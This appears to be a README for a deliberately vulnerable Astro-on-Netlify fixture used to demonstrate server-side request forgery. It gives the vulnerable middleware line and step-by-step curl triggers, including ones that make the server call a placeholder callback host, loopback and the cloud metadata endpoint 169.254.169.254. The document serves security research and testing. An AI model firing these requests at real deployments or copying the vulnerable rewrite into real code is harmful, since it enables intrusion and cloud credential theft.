# Astro Netlify Rewrite SSRF PoC

This fixture tests whether Astro middleware on the Netlify adapter turns an external `Request` rewrite into a server-side `fetch(target)`.

The intentionally vulnerable middleware is in `src/middleware.ts`:

```ts
return context.rewrite(new Request(target));
```

## Local

Install and build:

```bash
pnpm install
pnpm build
```

Start the callback listener in one shell:

```bash
node scripts/callback-server.mjs
```

Start Netlify local dev in another shell:

```bash
pnpm preview
```

Trigger the PoC:

```bash
curl -i 'http://127.0.0.1:8790/?target=http://127.0.0.1:9909/from-netlify-local&mode=request'
```

Expected signal: the callback server logs a request to `/from-netlify-local`.

Or run the automated local smoke test:

```bash
pnpm smoke:local
```

Control case:

```bash
curl -i 'http://127.0.0.1:8790/?target=http://127.0.0.1:9909/from-url-control&mode=url'
```

## Remote Netlify

Use a public callback URL for remote testing, for example an interactsh/webhook.site endpoint or a Cloudflare Worker that logs requests.

Deploy draft:

```bash
pnpm build
NETLIFY_SITE_ID=<site-id> pnpm deploy:draft
```

If the CLI is not logged in, either run `pnpm exec netlify login` first or provide `NETLIFY_AUTH_TOKEN`:

```bash
NETLIFY_AUTH_TOKEN=<token> NETLIFY_SITE_ID=<site-id> pnpm deploy:draft
```

Trigger against the draft URL returned by Netlify:

```bash
curl -i 'https://<draft-host>/?target=https://<callback-host>/from-netlify-remote&mode=request'
```

Or use the trigger helper, which forces the generated middleware's direct `fetch(target)` branch by using a POST target request:

```bash
TARGET_BASE='https://<draft-host>/' CALLBACK_URL='https://<callback-host>/from-netlify-remote' pnpm trigger:remote
```

Diagnostic control: bypass `context.rewrite()` and fetch from user middleware directly.

```bash
MODE=direct TARGET_BASE='https://<draft-host>/' CALLBACK_URL='https://<callback-host>/direct' pnpm trigger:remote
```

Then test private/internal destinations only against infrastructure you own or are authorized to test:

```bash
curl -i 'https://<draft-host>/?target=http://127.0.0.1:9909/internal-loopback&mode=request'
curl -i 'https://<draft-host>/?target=http://169.254.169.254/latest/meta-data/&mode=request'
```

Record whether the response status changes and whether the callback receives any request.
